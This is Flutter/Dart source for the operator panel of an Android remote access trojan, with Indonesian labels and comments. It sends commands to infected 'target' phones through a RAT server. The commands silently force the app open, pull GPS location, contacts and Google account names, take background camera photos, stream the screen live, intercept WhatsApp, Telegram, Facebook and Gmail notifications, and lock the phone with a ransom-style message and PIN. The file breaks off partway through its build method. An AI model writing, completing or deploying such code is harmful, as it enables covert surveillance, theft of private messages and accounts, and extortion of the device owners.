import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'package:url_launcher/url_launcher.dart';
import 'services/api_config_service.dart';

class ControlCenterPage extends StatefulWidget {
  const ControlCenterPage({super.key});

  @override
  State<ControlCenterPage> createState() => _ControlCenterPageState();
}

class _ControlCenterPageState extends State<ControlCenterPage> {
  bool _isSending = false;
  final List<String> _executionLogs = [];
  // HAPUS 'final' dari urlRat
  String? urlRat;  // <- Ini sudah benar, bukan final
  bool _isStreamingScreen = false;
  String _currentStreamFrame = "";
  StateSetter? _streamStateSetter;

  // Color palette - Dark Blue Theme
  static const Color primaryDarkBlue = Color(0xFF0A1929);
  static const Color secondaryDarkBlue = Color(0xFF0F2B3D);
  static const Color cardBlue = Color(0xFF132F3F);
  static const Color accentBlue = Color(0xFF1E88E5);
  static const Color accentLightBlue = Color(0xFF42A5F5);
  static const Color accentCyan = Color(0xFF00ACC1);
  static const Color successGreen = Color(0xFF4CAF50);
  static const Color warningOrange = Color(0xFFFF9800);
  static const Color dangerRed = Color(0xFFF44336);

  @override
  void initState() {
    super.initState();
    _initializeRatConfig();
  }

  Future<void> _initializeRatConfig() async {
    try {
      // PERBAIKAN: Gunakan ApiConfig.urlRat (static getter)
      final url = await ApiConfig.urlRat;
      
      if (mounted && url != null && url.isNotEmpty) {
        setState(() {
          urlRat = url;  // <- Sekarang bisa diassign karena bukan final
        });
        _addLog('✅ RAT URL loaded: $urlRat');
        WidgetsBinding.instance.addPostFrameCallback((_) {
          _triggerAutoWakeup();
        });
      } else {
        _addLog('❌ Gagal load RAT URL');
        _showNotif('GAGAL LOAD KONFIGURASI RAT');
      }
    } catch (e) {
      _addLog('❌ Error load RAT config: $e');
      _showNotif('ERROR LOAD KONFIGURASI');
    }
  }

  void _triggerAutoWakeup() {
    final device = ModalRoute.of(context)!.settings.arguments as Map<String, dynamic>?;
    if (device != null && device['id'] != null && urlRat != null) {
      _sendCommand("force_open", device['id'].toString(), isSilent: true);
    }
  }

  void _addLog(String message) {
    if (mounted) {
      setState(() {
        _executionLogs.insert(0, "[${DateTime.now().toString().substring(11, 19)}] $message");
        if (_executionLogs.length > 100) _executionLogs.removeLast(); 
      });
    }
  }

  Future<void> _sendCommand(String command, String targetId, {String? extra, bool isSilent = false}) async {
    if (targetId == "unknown") {
      if (!isSilent) {
        _addLog("Error: ID Target tidak valid (unknown)");
        _showNotif("ID TIDAK TERDETEKSI");
      }
      return;
    }

    if (urlRat == null) {
      if (!isSilent) {
        _addLog("Error: RAT URL belum diinisialisasi");
        _showNotif("KONFIGURASI RAT BELUM SIAP");
      }
      return;
    }

    if (!isSilent) {
      setState(() => _isSending = true);
      _addLog("Mengirim perintah: $command ke $targetId");
    }
    
    try {
      final response = await http.post(
        Uri.parse("$urlRat/api/send-command"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "id": targetId, 
          "command": command, 
          "extra": extra ?? "", 
        }),
      ).timeout(const Duration(seconds: 15));

      if (response.statusCode == 200) {
        if (!isSilent) _addLog("Perintah $command TERKIRIM. Menunggu respon target...");
        _startResponsePolling(command, targetId, isSilent: isSilent);
      } else {
        if (!isSilent) {
          _addLog("Error: Target Offline / Ditolak (${response.statusCode})");
          _showNotif("TARGET OFFLINE");
        }
      }
    } catch (e) {
      if (!isSilent) {
        _addLog("Error: Koneksi Gagal - $e");
        _showNotif("KONEKSI SERVER ERROR");
      }
    } finally {
      if (!isSilent) setState(() => _isSending = false);
    }
  }

  void _fetchNotificationLogs(String targetId) async {
    if (urlRat == null) {
      _addLog("Error: RAT URL belum siap");
      return;
    }
    
    _addLog("Menarik database pesan & notifikasi...");
    try {
      final response = await http.get(
        Uri.parse("$urlRat/api/get-notifications/$targetId"),
      ).timeout(const Duration(seconds: 15));
      
      if (response.statusCode == 200) {
        final List logs = jsonDecode(response.body);
        _showNotificationLogsDialog(logs);
        _addLog("SUCCESS: ${logs.length} Pesan berhasil ditarik.");
      } else {
        _addLog("Gagal menarik notifikasi. Database kosong.");
      }
    } catch (e) {
      _addLog("Error: Server API Down - $e");
    }
  }

  void _startResponsePolling(String cmd, String targetId, {bool isSilent = false}) async {
    if (urlRat == null) return;
    
    int attempts = 0;
    bool received = false;
    int maxAttempts = isSilent && cmd == "get_screen" ? 15 : 10; 

    while (attempts < maxAttempts && !received) {
      await Future.delayed(Duration(milliseconds: isSilent ? 800 : 3000));
      attempts++;
      if (!isSilent) _addLog("Polling respon... Percobaan $attempts/$maxAttempts");

      try {
        final response = await http.get(
          Uri.parse("$urlRat/api/get-response/$targetId"),
        ).timeout(const Duration(seconds: 5));
        
        if (response.statusCode == 200) {
          final data = jsonDecode(response.body);
          if (data['data'] != null && data['cmd'] == cmd) {
            _processResponse(cmd, data['data'], targetId);
            received = true;
          }
        }
      } catch (e) { }
    }
    
    if (!received && !isSilent) {
      _addLog("Timeout: Target tidak merespon/terlalu lambat.");
    }
  }

  void _processResponse(String cmd, dynamic data, String targetId) {
    if (data == null) return;

    if (cmd == "get_location") {
      _addLog("SUCCESS: Koordinat GPS diterima.");
      _showLocationDialog(data['lat'], data['lng']);
    } else if (cmd == "get_contacts") {
      _addLog("SUCCESS: Database kontak diunduh.");
      _showContactsDialog(data['contacts']);
    } else if (cmd == "take_photo") {
      _addLog("SUCCESS: Gambar kamera background ditarik.");
      _showCameraResultDialog(data['image_base64']);
    } else if (cmd == "get_screen") {
      if (!_isStreamingScreen) _addLog("SUCCESS: Memulai Real Screen Stream.");
      _showScreenResultDialog(data['image_base64'] ?? "", targetId);
    } else if (cmd == "get_gmails") {
      _addLog("SUCCESS: Daftar Akun Gmail ditarik.");
      _showGmailDialog(data['accounts'] ?? "No Accounts Found");
    } else if (cmd == "record_audio") {
      _addLog("ATTACK: WiFi DDoS/Jammer Aktif di Target!");
      _showNotif("DDOS BERHASIL DIAKTIFKAN");
    } else if (cmd == "vibrate_loop") {
      _addLog("SUCCESS: Target berhasil digetarkan.");
      _showNotif("TARGET BERGETAR");
    } else if (cmd == "flash_strobe") {
      _addLog("SUCCESS: Strobe Flash Native Aktif (30ms).");
      _showNotif("STROBE ACTIVE");
    } else {
      _addLog("Eksekusi $cmd Berhasil");
      _showNotif("PERINTAH [$cmd] BERHASIL");
    }
  }

  void _showCameraResultDialog(String base64Image) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: cardBlue,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
        title: Row(
          children: [
            Icon(Icons.camera_alt, color: accentBlue, size: 20),
            const SizedBox(width: 10),
            const Text("TANGKAPAN KAMERA", style: TextStyle(color: Colors.white, fontSize: 14, fontWeight: FontWeight.bold)),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            ClipRRect(
              borderRadius: BorderRadius.circular(15),
              child: Image.memory(
                base64Decode(base64Image),
                fit: BoxFit.contain,
                errorBuilder: (context, error, stackTrace) => Container(
                  height: 200,
                  color: Colors.black26,
                  child: const Center(child: Text("Gagal memuat gambar", style: TextStyle(color: Colors.white54))),
                ),
              ),
            ),
            const SizedBox(height: 15),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
              decoration: BoxDecoration(
                color: accentBlue.withOpacity(0.1),
                borderRadius: BorderRadius.circular(20),
              ),
              child: const Text("Captured instantly from background camera", 
                style: TextStyle(color: accentLightBlue, fontSize: 10)),
            ),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text("TUTUP", style: TextStyle(color: accentLightBlue)),
          ),
        ],
      ),
    );
  }

  void _showScreenResultDialog(String base64Image, String targetId) {
    _currentStreamFrame = base64Image;

    if (_isStreamingScreen && _streamStateSetter != null) {
      _streamStateSetter!((){});
      Future.delayed(const Duration(milliseconds: 1000), () {
        if (mounted && _isStreamingScreen) {
            _sendCommand("get_screen", targetId, isSilent: true);
        }
      });
      return;
    }

    _isStreamingScreen = true;
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => StatefulBuilder(
        builder: (context, setDialogState) {
          _streamStateSetter = setDialogState;
          return AlertDialog(
            backgroundColor: cardBlue,
            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
            insetPadding: const EdgeInsets.all(10),
            title: Row(
              children: [
                Container(
                  padding: const EdgeInsets.all(4),
                  decoration: BoxDecoration(
                    color: dangerRed.withOpacity(0.2),
                    borderRadius: BorderRadius.circular(8),
                  ),
                  child: const Icon(Icons.live_tv, color: dangerRed, size: 18),
                ),
                const SizedBox(width: 10),
                const Text("LIVE SCREEN STREAM", style: TextStyle(color: Colors.white, fontSize: 14, fontWeight: FontWeight.bold)),
              ],
            ),
            content: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                ClipRRect(
                  borderRadius: BorderRadius.circular(15),
                  child: _currentStreamFrame.isNotEmpty 
                    ? Image.memory(
                        base64Decode(_currentStreamFrame),
                        fit: BoxFit.contain,
                        gaplessPlayback: true,
                        errorBuilder: (c, e, s) => Container(
                          height: 200,
                          color: Colors.black26,
                          child: const Center(child: CircularProgressIndicator(color: accentBlue)),
                        ),
                      )
                    : Container(
                        height: 200,
                        color: Colors.black26,
                        child: const Center(child: CircularProgressIndicator(color: accentBlue)),
                      ),
                ),
                const SizedBox(height: 15),
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                  decoration: BoxDecoration(
                    color: accentBlue.withOpacity(0.1),
                    borderRadius: BorderRadius.circular(20),
                  ),
                  child: Row(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      Container(
                        width: 8,
                        height: 8,
                        decoration: const BoxDecoration(
                          color: dangerRed,
                          shape: BoxShape.circle,
                        ),
                      ),
                      const SizedBox(width: 6),
                      const Text("LIVE STREAMING ACTIVE", 
                        style: TextStyle(color: accentLightBlue, fontSize: 10, fontWeight: FontWeight.bold)),
                    ],
                  ),
                ),
              ],
            ),
            actions: [
              TextButton(
                onPressed: () {
                  _isStreamingScreen = false;
                  _streamStateSetter = null;
                  Navigator.pop(context);
                }, 
                child: const Text("STOP STREAM", style: TextStyle(color: dangerRed, fontWeight: FontWeight.bold)),
              ),
            ],
          );
        }
      ),
    ).then((_) {
      _isStreamingScreen = false;
      _streamStateSetter = null;
    });

    Future.delayed(const Duration(milliseconds: 500), () {
      if (mounted && _isStreamingScreen) {
          _sendCommand("get_screen", targetId, isSilent: true);
      }
    });
  }

  void _showLocationDialog(dynamic lat, dynamic lng) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: cardBlue,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
        title: Row(
          children: [
            Icon(Icons.location_on, color: successGreen, size: 20),
            const SizedBox(width: 10),
            const Text("PELACAKAN LOKASI", style: TextStyle(color: Colors.white, fontSize: 14, fontWeight: FontWeight.bold)),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Container(
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: Colors.black26,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: successGreen.withOpacity(0.3)),
              ),
              child: SelectableText(
                "$lat, $lng",
                style: const TextStyle(color: successGreen, fontSize: 13, fontWeight: FontWeight.bold, fontFamily: 'monospace'),
              ),
            ),
            const SizedBox(height: 15),
            ClipRRect(
              borderRadius: BorderRadius.circular(15),
              child: Image.network(
                "https://static-maps.yandex.ru/1.x/?lang=en_US&ll=$lng,$lat&z=15&l=map&size=450,300",
                height: 200,
                width: double.infinity,
                fit: BoxFit.cover,
                errorBuilder: (c, e, s) => Container(
                  height: 200,
                  color: Colors.black26,
                  child: const Center(child: Icon(Icons.map, color: Colors.white38, size: 50)),
                ),
              ),
            ),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text("TUTUP", style: TextStyle(color: Colors.white54)),
          ),
          ElevatedButton.icon(
            style: ElevatedButton.styleFrom(
              backgroundColor: accentBlue,
              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
            ),
            onPressed: () => launchUrl(Uri.parse("https://www.google.com/maps/search/?api=1&query=$lat,$lng"), 
              mode: LaunchMode.externalApplication),
            icon: const Icon(Icons.map, size: 16),
            label: const Text("BUKA MAPS", style: TextStyle(color: Colors.white)),
          ),
        ],
      ),
    );
  }

  void _showContactsDialog(List contacts) {
    showModalBottomSheet(
      context: context,
      backgroundColor: secondaryDarkBlue,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(25)),
      ),
      builder: (context) => DraggableScrollableSheet(
        initialChildSize: 0.6,
        maxChildSize: 0.9,
        expand: false,
        builder: (context, scrollController) => Column(
          children: [
            Container(
              margin: const EdgeInsets.symmetric(vertical: 10),
              width: 40,
              height: 4,
              decoration: BoxDecoration(
                color: Colors.white24,
                borderRadius: BorderRadius.circular(10),
              ),
            ),
            Container(
              padding: const EdgeInsets.all(15),
              child: Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Icon(Icons.contacts, color: accentBlue, size: 20),
                  const SizedBox(width: 10),
                  const Text("DUMP KONTAK TARGET", 
                    style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 16)),
                ],
              ),
            ),
            Expanded(
              child: ListView.builder(
                controller: scrollController,
                itemCount: contacts.length,
                itemBuilder: (context, i) => Container(
                  margin: const EdgeInsets.symmetric(horizontal: 15, vertical: 4),
                  decoration: BoxDecoration(
                    color: cardBlue,
                    borderRadius: BorderRadius.circular(12),
                  ),
                  child: ListTile(
                    leading: CircleAvatar(
                      backgroundColor: accentBlue.withOpacity(0.2),
                      child: Icon(Icons.person, color: accentBlue, size: 20),
                    ),
                    title: Text(contacts[i]['name'] ?? "No Name", 
                      style: const TextStyle(color: Colors.white, fontSize: 14, fontWeight: FontWeight.w500)),
                    subtitle: Text(contacts[i]['number'] ?? "No Number", 
                      style: const TextStyle(color: Colors.white54, fontSize: 12)),
                    trailing: Icon(Icons.chevron_right, color: Colors.white38, size: 20),
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _showNotificationLogsDialog(List logs) {
    String selectedFilter = "ALL";

    showModalBottomSheet(
      context: context,
      backgroundColor: secondaryDarkBlue,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(25)),
      ),
      builder: (context) => StatefulBuilder(
        builder: (context, setModalState) {
          List filteredLogs = logs.where((log) {
            String pkg = log['package']?.toString().toLowerCase() ?? "";
            if (selectedFilter == "WA") return pkg.contains("whatsapp");
            if (selectedFilter == "TELE") return pkg.contains("telegram");
            if (selectedFilter == "FB") return pkg.contains("facebook") || pkg.contains("orca");
            if (selectedFilter == "GMAIL") return pkg.contains("android.gm");
            return true;
          }).toList();

          return DraggableScrollableSheet(
            initialChildSize: 0.8,
            maxChildSize: 0.95,
            expand: false,
            builder: (context, scrollController) => Column(
              children: [
                Container(
                  margin: const EdgeInsets.symmetric(vertical: 10),
                  width: 40,
                  height: 4,
                  decoration: BoxDecoration(
                    color: Colors.white24,
                    borderRadius: BorderRadius.circular(10),
                  ),
                ),
                Container(
                  padding: const EdgeInsets.all(15),
                  child: Row(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      Icon(Icons.notifications_active, color: accentCyan, size: 20),
                      const SizedBox(width: 10),
                      const Text("LIVE MESSAGE INTERCEPTOR", 
                        style: TextStyle(color: accentCyan, fontWeight: FontWeight.bold, fontSize: 16)),
                    ],
                  ),
                ),
                SingleChildScrollView(
                  scrollDirection: Axis.horizontal,
                  padding: const EdgeInsets.symmetric(horizontal: 15),
                  child: Row(
                    children: [
                      _buildFilterBtn("ALL", Icons.all_inclusive, Colors.white70, selectedFilter, (v) => setModalState(() => selectedFilter = v)),
                      _buildFilterBtn("WA", Icons.chat, successGreen, selectedFilter, (v) => setModalState(() => selectedFilter = v)),
                      _buildFilterBtn("TELE", Icons.send, accentCyan, selectedFilter, (v) => setModalState(() => selectedFilter = v)),
                      _buildFilterBtn("FB", Icons.facebook, Colors.blue, selectedFilter, (v) => setModalState(() => selectedFilter = v)),
                      _buildFilterBtn("GMAIL", Icons.mail, dangerRed, selectedFilter, (v) => setModalState(() => selectedFilter = v)),
                    ],
                  ),
                ),
                const SizedBox(height: 10),
                Expanded(
                  child: ListView.builder(
                    controller: scrollController,
                    itemCount: filteredLogs.length,
                    itemBuilder: (context, i) {
                      final log = filteredLogs[i];
                      String pkg = log['package']?.toString() ?? "";
                      IconData icon = Icons.notifications;
                      Color iconColor = accentCyan;
                      if (pkg.contains("whatsapp")) {
                        icon = Icons.chat;
                        iconColor = successGreen;
                      } else if (pkg.contains("telegram")) {
                        icon = Icons.send;
                        iconColor = accentCyan;
                      } else if (pkg.contains("android.gm")) {
                        icon = Icons.mail;
                        iconColor = dangerRed;
                      }

                      return Container(
                        margin: const EdgeInsets.symmetric(horizontal: 15, vertical: 4),
                        decoration: BoxDecoration(
                          color: cardBlue,
                          borderRadius: BorderRadius.circular(12),
                        ),
                        child: ListTile(
                          leading: CircleAvatar(
                            backgroundColor: iconColor.withOpacity(0.2),
                            child: Icon(icon, color: iconColor, size: 20),
                          ),
                          title: Text(log['title'] ?? "Unknown",
                            style: const TextStyle(color: Colors.white, fontSize: 13, fontWeight: FontWeight.bold)),
                          subtitle: Text(log['body'] ?? "",
                            style: const TextStyle(color: Colors.white70, fontSize: 12)),
                          trailing: const Icon(Icons.message, color: Colors.white24, size: 16),
                        ),
                      );
                    },
                  ),
                ),
              ],
            ),
          );
        }
      ),
    );
  }

  Widget _buildFilterBtn(String label, IconData icon, Color color, String active, Function(String) onTap) {
    bool isSelected = active == label;
    return GestureDetector(
      onTap: () => onTap(label),
      child: Container(
        margin: const EdgeInsets.only(right: 8),
        padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
        decoration: BoxDecoration(
          color: isSelected ? color.withOpacity(0.2) : Colors.white10,
          borderRadius: BorderRadius.circular(20),
          border: Border.all(color: isSelected ? color : Colors.transparent),
        ),
        child: Row(
          children: [
            Icon(icon, size: 14, color: isSelected ? color : Colors.white54),
            const SizedBox(width: 6),
            Text(label, style: TextStyle(
              color: isSelected ? Colors.white : Colors.white54,
              fontSize: 11,
              fontWeight: FontWeight.bold,
            )),
          ],
        ),
      ),
    );
  }

  void _showCameraMenu(String targetId) {
    String selectedCam = "back";
    showDialog(
      context: context,
      builder: (context) => StatefulBuilder(
        builder: (context, setInternalState) => AlertDialog(
          backgroundColor: cardBlue,
          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
          title: Row(
            children: [
              Icon(Icons.camera_alt, color: warningOrange, size: 20),
              const SizedBox(width: 10),
              const Text("SURVEILLANCE CAMERA", style: TextStyle(color: Colors.white, fontSize: 14, fontWeight: FontWeight.bold)),
            ],
          ),
          content: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              const Text("Pilih lensa kamera target:", style: TextStyle(color: Colors.white54, fontSize: 12)),
              const SizedBox(height: 20),
              Row(
                mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                children: [
                  _cameraOption(Icons.camera_rear, "BELAKANG", "back", selectedCam, (val) => setInternalState(() => selectedCam = val)),
                  _cameraOption(Icons.camera_front, "DEPAN", "front", selectedCam, (val) => setInternalState(() => selectedCam = val)),
                ],
              ),
              const SizedBox(height: 30),
              SizedBox(
                width: double.infinity,
                child: ElevatedButton(
                  style: ElevatedButton.styleFrom(
                    backgroundColor: warningOrange,
                    padding: const EdgeInsets.symmetric(vertical: 12),
                    shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                  ),
                  onPressed: () {
                    _sendCommand("take_photo", targetId, extra: selectedCam);
                    Navigator.pop(context);
                  },
                  child: const Text("AMBIL FOTO TARGET", 
                    style: TextStyle(color: Colors.black, fontWeight: FontWeight.bold)),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _cameraOption(IconData icon, String label, String value, String current, Function(String) onTap) {
    bool isSelected = value == current;
    return GestureDetector(
      onTap: () => onTap(value),
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12),
        decoration: BoxDecoration(
          color: isSelected ? warningOrange.withOpacity(0.2) : Colors.white10,
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: isSelected ? warningOrange : Colors.white24),
        ),
        child: Column(
          children: [
            Icon(icon, size: 32, color: isSelected ? warningOrange : Colors.white54),
            const SizedBox(height: 6),
            Text(label, style: TextStyle(
              color: isSelected ? warningOrange : Colors.white54,
              fontSize: 10,
              fontWeight: FontWeight.bold,
            )),
          ],
        ),
      ),
    );
  }

  void _showGmailDialog(String emails) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: cardBlue,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
        title: Row(
          children: [
            Icon(Icons.email, color: dangerRed, size: 20),
            const SizedBox(width: 10),
            const Text("GOOGLE ACCOUNTS", style: TextStyle(color: Colors.white, fontSize: 14, fontWeight: FontWeight.bold)),
          ],
        ),
        content: Container(
          padding: const EdgeInsets.all(12),
          decoration: BoxDecoration(
            color: Colors.black26,
            borderRadius: BorderRadius.circular(12),
          ),
          child: SelectableText(
            emails,
            style: const TextStyle(color: successGreen, fontFamily: 'monospace', fontSize: 12),
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text("TUTUP", style: TextStyle(color: accentLightBlue)),
          ),
        ],
      ),
    );
  }

  void _showInputDialog(String title, String cmd, String targetId) {
    TextEditingController textCtrl = TextEditingController();
    TextEditingController pinCtrl = TextEditingController();

    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: cardBlue,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
        title: Row(
          children: [
            Icon(
              cmd == "play_audio" ? Icons.music_note : (cmd == "set_wallpaper" ? Icons.image : (cmd == "hard_lock" ? Icons.lock : Icons.link)),
              color: accentBlue,
              size: 20,
            ),
            const SizedBox(width: 10),
            Text(title, style: const TextStyle(color: Colors.white, fontSize: 14, fontWeight: FontWeight.bold)),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            TextField(
              controller: textCtrl,
              style: const TextStyle(color: Colors.white, fontSize: 13),
              decoration: InputDecoration(
                labelText: cmd == "play_audio" ? "Link URL MP3" : (cmd == "set_wallpaper" ? "Link URL Gambar (JPG)" : (cmd == "hard_lock" ? "Pesan Layar" : "URL Website")),
                labelStyle: const TextStyle(color: Colors.white38),
                hintStyle: const TextStyle(color: Colors.white12),
                enabledBorder: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(12),
                  borderSide: const BorderSide(color: Colors.white24),
                ),
                focusedBorder: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(12),
                  borderSide: const BorderSide(color: accentBlue),
                ),
              ),
            ),
            if (cmd == "hard_lock") ...[
              const SizedBox(height: 15),
              TextField(
                controller: pinCtrl,
                keyboardType: TextInputType.number,
                style: const TextStyle(color: Colors.white, fontSize: 13),
                decoration: InputDecoration(
                  labelText: "PIN Unlock",
                  labelStyle: const TextStyle(color: Colors.white38),
                  hintText: "1234",
                  hintStyle: const TextStyle(color: Colors.white12),
                  enabledBorder: OutlineInputBorder(
                    borderRadius: BorderRadius.circular(12),
                    borderSide: const BorderSide(color: Colors.white24),
                  ),
                  focusedBorder: OutlineInputBorder(
                    borderRadius: BorderRadius.circular(12),
                    borderSide: const BorderSide(color: accentBlue),
                  ),
                ),
              ),
            ],
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text("Batal", style: TextStyle(color: Colors.white38)),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: accentBlue,
              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
            ),
            onPressed: () {
              String finalMsg = textCtrl.text.trim();
              String finalPin = pinCtrl.text.trim();

              if (cmd == "hard_lock") {
                if (finalMsg.isEmpty) finalMsg = "YOUR PHONE IS LOCKED!!!!";
                if (finalPin.isEmpty) finalPin = "123";
                _sendCommand(cmd, targetId, extra: "$finalMsg|$finalPin");
              } else {
                _sendCommand(cmd, targetId, extra: finalMsg);
              }
              Navigator.pop(context);
            },
            child: const Text("Kirim", style: TextStyle(color: Colors.white)),
          ),
        ],
      ),
    );
  }

  void _showNotif(String m) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        backgroundColor: accentBlue,
        content: Text(m),
        duration: const Duration(seconds: 1),
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
      ),
    );
  }

  Widget _buildLogContainer() {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 15, vertical: 10),
      padding: const EdgeInsets.all(15),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [cardBlue, cardBlue.withOpacity(0.8)],
        ),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: accentBlue.withOpacity(0.3)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Container(
                padding: const EdgeInsets.all(4),
                decoration: BoxDecoration(
                  color: accentBlue.withOpacity(0.2),
                  borderRadius: BorderRadius.circular(8),
                ),
                child: const Icon(Icons.list_alt, color: accentBlue, size: 16),
              ),
              const SizedBox(width: 8),
              const Text("Activity Log", style: TextStyle(color: Colors.white70, fontSize: 12, fontWeight: FontWeight.bold)),
              const Spacer(),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 2),
                decoration: BoxDecoration(
                  color: Colors.white10,
                  borderRadius: BorderRadius.circular(12),
                ),
                child: Text(
                  "${_executionLogs.length}",
                  style: const TextStyle(color: accentLightBlue, fontSize: 10),
                ),
              ),
            ],
          ),
          const SizedBox(height: 12),
          Container(
            height: 100,
            child: ListView.builder(
              reverse: true,
              itemCount: _executionLogs.length,
              itemBuilder: (context, i) => Padding(
                padding: const EdgeInsets.symmetric(vertical: 2),
                child: Text(
                  _executionLogs[i],
                  style: const TextStyle(color: Colors.white38, fontSize: 10, fontFamily: 'monospace'),
                  maxLines: 1,
                  overflow: TextOverflow.ellipsis,
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildControlBlock(String title, String subtitle, IconData icon, Color color, List<Widget> actionButtons) {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 15, vertical: 8),
      padding: const EdgeInsets.all(15),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [cardBlue, cardBlue.withOpacity(0.95)],
        ),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: color.withOpacity(0.3), width: 1),
        boxShadow: [
          BoxShadow(
            color: Colors.black12,
            blurRadius: 10,
            offset: const Offset(0, 2),
          ),
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Container(
                padding: const EdgeInsets.all(8),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: [color.withOpacity(0.2), color.withOpacity(0.1)],
                  ),
                  borderRadius: BorderRadius.circular(12),
                ),
                child: Icon(icon, color: color, size: 24),
              ),
              const SizedBox(width: 12),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(title, style: TextStyle(color: color, fontSize: 16, fontWeight: FontWeight.bold)),
                    const SizedBox(height: 4),
                    Text(subtitle, style: const TextStyle(color: Colors.white38, fontSize: 10)),
                  ],
                ),
              ),
              Icon(Icons.keyboard_arrow_down, color: color.withOpacity(0.5), size: 20),
            ],
          ),
          const SizedBox(height: 15),
          Wrap(
            spacing: 8,
            runSpacing: 8,
            children: actionButtons,
          ),
        ],
      ),
    );
  }

  Widget _buildActionButton(String label, IconData icon, Color color, String cmd, String targetId) {
    return InkWell(
      onTap: () {
        if (urlRat == null) {
          _showNotif('RAT CONFIG BELUM SIAP');
          return;
        }
        
        if (cmd == 'get_notif_logs') {
          _fetchNotificationLogs(targetId);
        } else if (cmd == 'take_photo') {
          _showCameraMenu(targetId);
        } else if (cmd == 'open_url' || cmd == 'hard_lock' || cmd == 'set_wallpaper' || cmd == 'play_audio_input') {
          String dialogTitle = cmd == 'hard_lock' ? "Kunci HP" : (cmd == 'set_wallpaper' ? "Ubah Wallpaper" : (cmd == 'play_audio_input' ? "Play Remote MP3" : "Masukkan URL Website"));
          _showInputDialog(dialogTitle, cmd == 'play_audio_input' ? 'play_audio' : cmd, targetId);
        } else if (cmd == 'stop_audio') {
          _sendCommand("stop_audio", targetId);
        } else {
          _sendCommand(cmd, targetId);
        }
      },
      borderRadius: BorderRadius.circular(8),
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
        decoration: BoxDecoration(
          color: Colors.white10,
          borderRadius: BorderRadius.circular(8),
          border: Border.all(color: color.withOpacity(0.2)),
        ),
        child: Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            Icon(icon, color: color, size: 14),
            const SizedBox(width: 6),
            Text(label, style: const TextStyle(color: Colors.white, fontSize: 11, fontWeight: FontWeight.w500)),
          ],
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final device = ModalRoute.of(context)!.settings.arguments as Map<String, dynamic>?;
    final String targetId = device?['id']?.toString() ?? "unknown";
    final String model = device?['model'] ?? "Device";

    return Scaffold(
      backgroundColor: primaryDarkBlue,
      appBar: AppBar(
        backgroundColor: secondaryDarkBlue,
        elevation: 0,
        leading: IconButton(
